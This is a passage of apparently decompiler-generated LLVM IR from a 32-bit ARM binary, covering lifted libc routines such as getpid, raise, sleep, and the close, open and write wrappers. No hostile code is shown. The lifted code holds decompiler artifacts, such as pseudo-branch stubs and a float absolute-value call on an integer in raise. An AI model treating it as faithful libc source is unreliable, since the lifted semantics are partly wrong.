  ret i32 %v7_192fc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19300 = load i32, i32* @r7, align 4
  store i32 %v3_19300, i32* %stack_var_-8, align 4
  %v0_19304 = call i32 @__aeabi_read_tp()
  store i32 %v0_19304, i32* %r0.global-to-local, align 4
  %v1_19308 = add i32 %v0_19304, -1060
  %v2_19308 = inttoptr i32 %v1_19308 to i32*
  %v3_19308 = load i32, i32* %v2_19308, align 4
  %tmp7 = icmp slt i32 %v3_19308, 1
  br i1 %tmp7, label %dec_label_pc_19318, label %dec_label_pc_1933c

dec_label_pc_19318:                               ; preds = %entry
  %v2_1930c = icmp eq i32 %v3_19308, 0
  br i1 %v2_1930c, label %dec_label_pc_1931c, label %dec_label_pc_19328

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19318
  %v1_1931c = add i32 %v0_19304, -1064
  %v2_1931c = inttoptr i32 %v1_1931c to i32*
  %v3_1931c = load i32, i32* %v2_1931c, align 4
  store i32 %v3_1931c, i32* %r0.global-to-local, align 4
  %v2_19320 = icmp eq i32 %v3_1931c, 0
  br i1 %v2_19320, label %bb, label %bb8

dec_label_pc_19328:                               ; preds = %dec_label_pc_19318
  br label %bb8

bb:                                               ; preds = %dec_label_pc_1931c
  store i32 0, i32* %v2_1931c, align 4
  %v0_19338.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_19328, %dec_label_pc_1931c, %bb
  %v0_19338 = phi i32 [ %v3_1931c, %dec_label_pc_1931c ], [ %v0_19304, %dec_label_pc_19328 ], [ %v0_19338.pre, %bb ]
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %entry, %bb8
  %v0_1933c = phi i32 [ %v3_19308, %entry ], [ %v0_19338, %bb8 ]
  store i32 %v0_1933c, i32* %r0.global-to-local, align 4
  %v2_19340 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19340, i32* @r7, align 4
  ret i32 %v0_1933c

; uselistorder directives
  uselistorder i32 %v0_1933c, { 1, 0 }
  uselistorder i32 %v3_19308, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1933c, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_19348 = load i32, i32* @r4, align 4
  store i32 %v3_19348, i32* %stack_var_-20, align 4
  %v0_19350 = call i32 @__aeabi_read_tp()
  store i32 %v0_19350, i32* %r0.global-to-local, align 4
  %v1_19354 = add i32 %v0_19350, -1064
  %v2_19354 = inttoptr i32 %v1_19354 to i32*
  %v3_19354 = load i32, i32* %v2_19354, align 4
  store i32 %v3_19354, i32* %r4.global-to-local, align 4
  %v2_19358 = icmp eq i32 %v3_19354, 0
  %v1_19360 = add i32 %v0_19350, -1060
  %v2_19360 = inttoptr i32 %v1_19360 to i32*
  %v3_19360 = load i32, i32* %v2_19360, align 4
  store i32 %v3_19360, i32* %r0.global-to-local, align 4
  br i1 %v2_19358, label %dec_label_pc_19368, label %dec_label_pc_1937c

dec_label_pc_19368:                               ; preds = %entry
  store i32 %v3_19360, i32* %r4.global-to-local, align 4
  store i32 %v3_19360, i32* %v2_19354, align 4
  %v0_193a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_1937c:                               ; preds = %entry
  %v5_19380 = icmp sgt i32 %v3_19360, 0
  br i1 %v5_19380, label %bb28, label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_1937c
  %tmp = bitcast i32 %v3_19360 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_19384 = bitcast float %tmp30 to i32
  %v2_19388 = icmp eq i32 %v1_19384, 0
  br i1 %v2_19388, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19384
  store i32 %v3_19354, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_19384
  %v2_19390 = sub i32 0, %v3_19360
  store i32 %v2_19390, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_1937c, %dec_label_pc_19368, %.thread
  %v0_193a8 = phi i32 [ %v3_19360, %dec_label_pc_1937c ], [ %v0_193a4.pre, %dec_label_pc_19368 ], [ %v3_19354, %bb ], [ %v2_19390, %.thread ]
  store i32 %v0_193a8, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_193a8, -4095
  br i1 %tmp31, label %dec_label_pc_193cc, label %dec_label_pc_193b4

dec_label_pc_193b4:                               ; preds = %bb28
  %v0_193b8 = call i32 @__aeabi_read_tp()
  %v3_193bc = load i16, i16* @global_var_32088.1320, align 2
  %v4_193bc = sext i16 %v3_193bc to i32
  %v0_193c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_193c0 = sub i32 0, %v0_193c0
  store i32 %v1_193c0, i32* %r2.global-to-local, align 4
  %v3_193c4 = add i32 %v4_193bc, %v0_193b8
  %v4_193c4 = inttoptr i32 %v3_193c4 to i32*
  store i32 %v1_193c0, i32* %v4_193c4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_193cc

dec_label_pc_193cc:                               ; preds = %bb28, %dec_label_pc_193b4
  %v0_193d0 = phi i32 [ %v0_193a8, %bb28 ], [ -1, %dec_label_pc_193b4 ]
  %v3_193cc = icmp eq i32 %v0_193d0, -1
  store i32 %v0_193d0, i32* %r5.global-to-local, align 4
  br i1 %v3_193cc, label %dec_label_pc_193d8, label %dec_label_pc_19420

dec_label_pc_193d8:                               ; preds = %dec_label_pc_193cc
  %v0_193dc = call i32 @__aeabi_read_tp()
  store i32 %v0_193dc, i32* %r0.global-to-local, align 4
  %v3_193e0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_193e0 = sext i16 %v3_193e0 to i32
  %v2_193e4 = add i32 %v4_193e0, %v0_193dc
  %v3_193e4 = inttoptr i32 %v2_193e4 to i32*
  %v4_193e4 = load i32, i32* %v3_193e4, align 4
  %v7_193e8 = icmp eq i32 %v4_193e4, 38
  br i1 %v7_193e8, label %dec_label_pc_193f4, label %dec_label_pc_193d8.dec_label_pc_19420_crit_edge

dec_label_pc_193d8.dec_label_pc_19420_crit_edge:  ; preds = %dec_label_pc_193d8
  %v0_19420.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19420

dec_label_pc_193f4:                               ; preds = %dec_label_pc_193d8
  %v0_193f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_193f4, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_193f4, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_193f4
  %v5_1940c = sub i32 0, %v0_193f4
  store i32 %v5_1940c, i32* %r2.global-to-local, align 4
  %v7_19410 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_19418.1584 to i32), i32 101488) to i32*), align 4
  %v4_19414 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_19414, i32* %r0.global-to-local, align 4
  %v7_19418 = add i32 %v7_19410, %v0_193dc
  %v8_19418 = inttoptr i32 %v7_19418 to i32*
  store i32 %v5_1940c, i32* %v8_19418, align 4
  %v0_1941c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_193f4, %bb29
  %v0_1941c = phi i32 [ %v0_1941c.pre, %bb29 ], [ %v0_193f4, %dec_label_pc_193f4 ]
  store i32 %v0_1941c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19420

dec_label_pc_19420:                               ; preds = %dec_label_pc_193d8.dec_label_pc_19420_crit_edge, %dec_label_pc_193cc, %.thread22
  %v0_19420 = phi i32 [ %v0_19420.pre, %dec_label_pc_193d8.dec_label_pc_19420_crit_edge ], [ %v0_193d0, %dec_label_pc_193cc ], [ %v0_1941c, %.thread22 ]
  store i32 %v0_19420, i32* %r0.global-to-local, align 4
  %v2_19424 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19424, i32* @r4, align 4
  ret i32 %v0_19420

; uselistorder directives
  uselistorder i32 %v0_19420, { 1, 0 }
  uselistorder i32 %v0_193f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_193a8, { 2, 0, 1 }
  uselistorder i32 %v3_19360, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 3, 2, 0, 1 }
  uselistorder i32 -1060, { 2, 0, 1 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_19420, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_193cc, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_19438 = load i32, i32* @r4, align 4
  %v6_19438 = load i32, i32* @r5, align 4
  %v9_19438 = load i32, i32* @r6, align 4
  %v12_19438 = load i32, i32* @r7, align 4
  %v15_19438 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19448 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_19448, label %dec_label_pc_1945c, label %dec_label_pc_194d0

dec_label_pc_1945c:                               ; preds = %entry
  %v0_1945c = call i32 @__aeabi_read_tp()
  %v1_19460 = add i32 %v0_1945c, -1036
  %v2_19460 = inttoptr i32 %v1_19460 to i32*
  %v3_19460 = load i32, i32* %v2_19460, align 4
  %v1_19464 = and i32 %v3_19460, -71
  %v2_19468 = icmp ugt i32 %v1_19464, 7
  store i1 %v2_19468, i1* %cpsr_c.global-to-local, align 1
  %v7_19468 = icmp eq i32 %v1_19464, 8
  %v1_1946c = add i32 %v0_1945c, -1168
  store i32 %v1_1946c, i32* @r5, align 4
  br i1 %v7_19468, label %dec_label_pc_19474, label %dec_label_pc_19548

dec_label_pc_19474:                               ; preds = %dec_label_pc_1945c
  %v2_19478 = add i32 %v0_1945c, -624
  %v3_19478 = inttoptr i32 %v2_19478 to i32*
  store i32 -1, i32* %v3_19478, align 4
  %v0_1947c = load i32, i32* @r5, align 4
  %v1_1947c = add i32 %v0_1947c, 132
  store i32 %v1_1947c, i32* @r6, align 4
  br label %dec_label_pc_19480

dec_label_pc_19480:                               ; preds = %dec_label_pc_194b4.dec_label_pc_19480_crit_edge, %dec_label_pc_19474
  %v0_19484 = phi i32 [ %v0_19484.pre, %dec_label_pc_194b4.dec_label_pc_19480_crit_edge ], [ %v1_1947c, %dec_label_pc_19474 ]
  %v0_19480 = phi i32 [ %v0_194bc, %dec_label_pc_194b4.dec_label_pc_19480_crit_edge ], [ %v0_1947c, %dec_label_pc_19474 ]
  %v1_19480 = add i32 %v0_19480, 132
  %v2_19480 = inttoptr i32 %v1_19480 to i32*
  %v3_19480 = load i32, i32* %v2_19480, align 4
  store i32 %v0_19484, i32* %r2.global-to-local, align 4
  store i32 %v3_19480, i32* @r4, align 4
  %v1_1949030 = inttoptr i32 %v0_19484 to i32*
  %v2_1949031 = load i32, i32* %v1_1949030, align 4
  %v3_1949433 = icmp uge i32 %v2_1949031, %v3_19480
  store i1 %v3_1949433, i1* %cpsr_c.global-to-local, align 1
  %v9_1949439 = icmp eq i32 %v2_1949031, %v3_19480
  br i1 %v9_1949439, label %dec_label_pc_1949c, label %dec_label_pc_194b4

dec_label_pc_1949c:                               ; preds = %dec_label_pc_19480, %dec_label_pc_1949c.dec_label_pc_19490_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_194ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_194ac, label %dec_label_pc_194b0, label %dec_label_pc_1949c.dec_label_pc_19490_crit_edge

dec_label_pc_1949c.dec_label_pc_19490_crit_edge:  ; preds = %dec_label_pc_1949c
  %v0_19490.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19494.pre = load i32, i32* @r4, align 4
  %v1_19490 = inttoptr i32 %v0_19490.pre to i32*
  %v2_19490 = load i32, i32* %v1_19490, align 4
  %v3_19494 = icmp uge i32 %v2_19490, %v1_19494.pre
  store i1 %v3_19494, i1* %cpsr_c.global-to-local, align 1
  %v9_19494 = icmp eq i32 %v2_19490, %v1_19494.pre
  br i1 %v9_19494, label %dec_label_pc_1949c, label %dec_label_pc_194b4

dec_label_pc_194b0:                               ; preds = %dec_label_pc_1949c
  %v0_194b0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_194b4

dec_label_pc_194b4:                               ; preds = %dec_label_pc_19480, %dec_label_pc_1949c.dec_label_pc_19490_crit_edge, %dec_label_pc_194b0
  %v0_194b4 = phi i32 [ %v0_194b0, %dec_label_pc_194b0 ], [ %v2_1949031, %dec_label_pc_19480 ], [ %v2_19490, %dec_label_pc_1949c.dec_label_pc_19490_crit_edge ]
  %v1_194b4 = phi i32 [ %v0_194b0, %dec_label_pc_194b0 ], [ %v3_19480, %dec_label_pc_19480 ], [ %v1_19494.pre, %dec_label_pc_1949c.dec_label_pc_19490_crit_edge ]
  %v3_194b4 = icmp uge i32 %v0_194b4, %v1_194b4
  store i1 %v3_194b4, i1* %cpsr_c.global-to-local, align 1
  %v9_194b4 = icmp eq i32 %v0_194b4, %v1_194b4
  br i1 %v9_194b4, label %dec_label_pc_194bc, label %dec_label_pc_194b4.dec_label_pc_19480_crit_edge

dec_label_pc_194b4.dec_label_pc_19480_crit_edge:  ; preds = %dec_label_pc_194b4
  %v0_194bc = load i32, i32* @r5, align 4
  %v0_19484.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19480

dec_label_pc_194bc:                               ; preds = %dec_label_pc_194b4
  %v0_194c4 = load i32, i32* @r7, align 4
  %v2_194c4 = add i32 %v0_194c4, 128
  %v3_194c4 = inttoptr i32 %v2_194c4 to i32*
  %v4_194c4 = load i32, i32* %v3_194c4, align 4
  store i32 103632, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_194c4)
  %v0_194d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_194d0

dec_label_pc_194d0:                               ; preds = %entry, %dec_label_pc_194bc
  %v0_194d8 = phi i32 [ 0, %entry ], [ %v0_194d8.pre, %dec_label_pc_194bc ]
  %v2_194dc = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_194dc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_194e8 = call i32 @__libc_sigaction(i32 17, i32 %v0_194d8, i32 %v2_194dc)
  %v3_194ec = load i32, i32* %stack_var_-60, align 4
  %v2_194f0 = icmp ne i32 %v3_194ec, 0
  store i1 %v2_194f0, i1* %cpsr_c.global-to-local, align 1
  %v7_194f0 = icmp eq i32 %v3_194ec, 1
  br i1 %v7_194f0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_194d0
  %v3_194f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_194f4, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_194d0, %bb
  call void @__pseudo_cond_branch(i1 %v7_194f0, i32 ptrtoint (i32* @global_var_14418.1589 to i32))
  %v2_19504 = ptrtoint i32* %stack_var_-32 to i32
  %v2_1950c = call i32 @__libc_nanosleep(i32 %v2_19504, i32 %v2_19504)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19510 = icmp eq i32 %v2_1950c, 0
  br i1 %v2_19510, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_19524 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_19524, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_19534 = load i32, i32* %stack_var_-40, align 4
  %v1_19538 = and i32 %v3_19534, 65536
  store i32 %v1_19538, i32* %r2.global-to-local, align 4
  %v2_19538 = icmp eq i32 %v1_19538, 0
  br i1 %v2_19538, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_19540 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_19540, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_19538, i32 ptrtoint (i32* @global_var_14418.1589 to i32))
  br label %dec_label_pc_19548

dec_label_pc_19548:                               ; preds = %dec_label_pc_1945c, %.thread5
  %v0_19548 = load i32, i32* @r4, align 4
  store i32 %v3_19438, i32* @r4, align 4
  store i32 %v6_19438, i32* @r5, align 4
  store i32 %v9_19438, i32* @r6, align 4
  store i32 %v12_19438, i32* @r7, align 4
  store i32 %v15_19438, i32* @lr, align 4
  ret i32 %v0_19548

; uselistorder directives
  uselistorder i32 %v0_194b0, { 1, 0 }
  uselistorder i32 %v1_19494.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder label %dec_label_pc_19548, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_194d0, { 1, 0 }
  uselistorder label %dec_label_pc_194b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1949c, { 1, 0 }
}

define i32 @function_1955c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1955c:
  %v0_1955c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1955c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_1955c
  %v4_1955c = mul i32 %arg1, 2
  %v5_1955c = and i32 %v4_1955c, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1955c, %bb
  %v0_19560 = phi i32 [ %arg1, %dec_label_pc_1955c ], [ %v5_1955c, %bb ]
  ret i32 %v0_19560

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_19584 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_19584, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_19584 = load i32, i32* @r0, align 4
  ret i32 %v2_19584

bb1:                                              ; preds = %entry
  %v0_19588 = call i32 @__syscall_error()
  ret i32 %v0_19588
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19594 = load i32, i32* @global_var_395d0.1593, align 4
  %v2_19598 = icmp eq i32 %v3_19594, 0
  store i1 %v2_19598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19598, label %dec_label_pc_195a0, label %entry.dec_label_pc_195bc_crit_edge

entry.dec_label_pc_195bc_crit_edge:               ; preds = %entry
  %v3_195bc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_195bc

dec_label_pc_195a0:                               ; preds = %entry
  %v0_195a0 = load i32, i32* @r7, align 4
  store i32 %v0_195a0, i32* @ip, align 4
  %v0_195b0 = load i32, i32* @r0, align 4
  %v2_195b0 = icmp ugt i32 %v0_195b0, -4097
  %v7_195b0 = icmp eq i32 %v0_195b0, -4096
  store i1 %v7_195b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195b0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_195bc, %bb8, %bb9, %dec_label_pc_195a0
  %merge2 = phi i32 [ %v0_195b0, %dec_label_pc_195a0 ], [ %v0_195e0, %dec_label_pc_195bc ], [ %v0_195f0, %bb8 ], [ %v0_195f0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_195a0
  %v0_195b8 = call i32 @__syscall_error()
  br label %dec_label_pc_195bc

dec_label_pc_195bc:                               ; preds = %entry.dec_label_pc_195bc_crit_edge, %bb7
  %v3_195bc = phi i32 [ %v3_195bc.pre, %entry.dec_label_pc_195bc_crit_edge ], [ %v0_195b8, %bb7 ]
  %v9_195bc = load i32, i32* @r7, align 4
  store i32 %v9_195bc, i32* %stack_var_-8, align 4
  %v12_195bc = load i32, i32* @lr, align 4
  %v0_195c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_195c0, i32* @ip, align 4
  store i32 %v3_195bc, i32* @r7, align 4
  %v1_195dc = call i32 @__libc_disable_asynccancel(i32 %v0_195c0)
  %v0_195e0 = load i32, i32* @r7, align 4
  store i32 %v0_195e0, i32* @r0, align 4
  %v2_195e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_195e4, i32* @r7, align 4
  store i32 %v12_195bc, i32* @lr, align 4
  %v2_195e8 = icmp ugt i32 %v0_195e0, -4097
  %v7_195e8 = icmp eq i32 %v0_195e0, -4096
  store i1 %v7_195e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195e8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_195bc
  %v0_195f0 = call i32 @__syscall_error()
  %v0_19600 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19600, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_19600 = load i32, i32* @r1, align 4
  %v2_19600 = load i32, i32* @r4, align 4
  %tmp = icmp slt i32 %v2_19600, 0
  %v5_19600 = zext i1 %tmp to i32
  %v6_19600 = and i32 %v5_19600, %v1_19600
  call void @__pseudo_branch(i32 %v6_19600)
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_195f0, { 1, 0 }
  uselistorder i32 %v0_195e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_195b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_195bc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_19614 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_19614, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_19614 = load i32, i32* @r0, align 4
  ret i32 %v2_19614

bb1:                                              ; preds = %entry
  %v0_19618 = call i32 @__syscall_error()
  ret i32 %v0_19618
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19624 = load i32, i32* @global_var_395d0.1593, align 4
  %v2_19628 = icmp eq i32 %v3_19624, 0
  store i1 %v2_19628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19628, label %dec_label_pc_19630, label %entry.dec_label_pc_1964c_crit_edge

entry.dec_label_pc_1964c_crit_edge:               ; preds = %entry
  %v3_1964c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1964c

dec_label_pc_19630:                               ; preds = %entry
  %v0_19630 = load i32, i32* @r7, align 4
  store i32 %v0_19630, i32* @ip, align 4
  %v0_19640 = load i32, i32* @r0, align 4
  %v2_19640 = icmp ugt i32 %v0_19640, -4097
  %v7_19640 = icmp eq i32 %v0_19640, -4096
  store i1 %v7_19640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19640, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1964c, %dec_label_pc_19630
  %merge = phi i32 [ %v0_19640, %dec_label_pc_19630 ], [ %v0_19670, %dec_label_pc_1964c ], [ %v0_19680, %bb10 ], [ %v4_19690, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_19630
  %v0_19648 = call i32 @__syscall_error()
  br label %dec_label_pc_1964c

dec_label_pc_1964c:                               ; preds = %entry.dec_label_pc_1964c_crit_edge, %bb9
  %v3_1964c = phi i32 [ %v3_1964c.pre, %entry.dec_label_pc_1964c_crit_edge ], [ %v0_19648, %bb9 ]
  store i32 %v3_1964c, i32* %stack_var_-24, align 4
  %v9_1964c = load i32, i32* @r2, align 4
  %v12_1964c = load i32, i32* @r3, align 4
  %v15_1964c = load i32, i32* @r7, align 4
  store i32 %v15_1964c, i32* %stack_var_-8, align 4
  %v18_1964c = load i32, i32* @lr, align 4
  %v0_19650 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_19650, i32* @ip, align 4
  %v2_19658 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1964c, i32* @r2, align 4
  store i32 %v12_1964c, i32* @r3, align 4
  store i32 %v2_19658, i32* @r7, align 4
  %v1_1966c = call i32 @__libc_disable_asynccancel(i32 %v0_19650)
  %v0_19670 = load i32, i32* @r7, align 4
  store i32 %v0_19670, i32* @r0, align 4
  %v2_19674 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19674, i32* @r7, align 4
  store i32 %v18_1964c, i32* @lr, align 4
  %v2_19678 = icmp ugt i32 %v0_19670, -4097
  %v7_19678 = icmp eq i32 %v0_19670, -4096
  store i1 %v7_19678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19678, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1964c
  %v0_19680 = call i32 @__syscall_error()
  %v0_19690 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19690, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v4_19690 = call i32 @__libc_errno(i32 %v0_19680)
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_19680, { 1, 0 }
  uselistorder i32 %v0_19670, { 0, 2, 3, 1 }
  uselistorder i32 %v0_19640, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1964c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_196a4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_196a4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_196a4 = load i32, i32* @r0, align 4
  ret i32 %v2_196a4

bb1:                                              ; preds = %entry
  %v0_196a8 = call i32 @__syscall_error()
  ret i32 %v0_196a8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_196b4 = load i32, i32* @global_var_395d0.1593, align 4
  %v2_196b8 = icmp eq i32 %v3_196b4, 0
  store i1 %v2_196b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196b8, label %dec_label_pc_196c0, label %entry.dec_label_pc_196dc_crit_edge

entry.dec_label_pc_196dc_crit_edge:               ; preds = %entry
  %v3_196dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_196dc

dec_label_pc_196c0:                               ; preds = %entry
  %v0_196c0 = load i32, i32* @r7, align 4
  store i32 %v0_196c0, i32* @ip, align 4
  %v0_196d0 = load i32, i32* @r0, align 4
  %v2_196d0 = icmp ugt i32 %v0_196d0, -4097
  %v7_196d0 = icmp eq i32 %v0_196d0, -4096
  store i1 %v7_196d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196d0, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_196dc, %bb10, %bb11, %dec_label_pc_196c0
  %merge2 = phi i32 [ %v0_196d0, %dec_label_pc_196c0 ], [ %v0_19700, %dec_label_pc_196dc ], [ %v0_19710, %bb10 ], [ %v0_19710, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_196c0
  %v0_196d8 = call i32 @__syscall_error()
  br label %dec_label_pc_196dc

dec_label_pc_196dc:                               ; preds = %entry.dec_label_pc_196dc_crit_edge, %bb9
  %v3_196dc = phi i32 [ %v3_196dc.pre, %entry.dec_label_pc_196dc_crit_edge ], [ %v0_196d8, %bb9 ]
  store i32 %v3_196dc, i32* %stack_var_-24, align 4
  %v12_196dc = load i32, i32* @r3, align 4
  %v15_196dc = load i32, i32* @r7, align 4
  store i32 %v15_196dc, i32* %stack_var_-8, align 4
  %v18_196dc = load i32, i32* @lr, align 4
  %v0_196e0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_196e0, i32* @ip, align 4
  %v2_196e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_196dc, i32* @r3, align 4
  store i32 %v2_196e8, i32* @r7, align 4
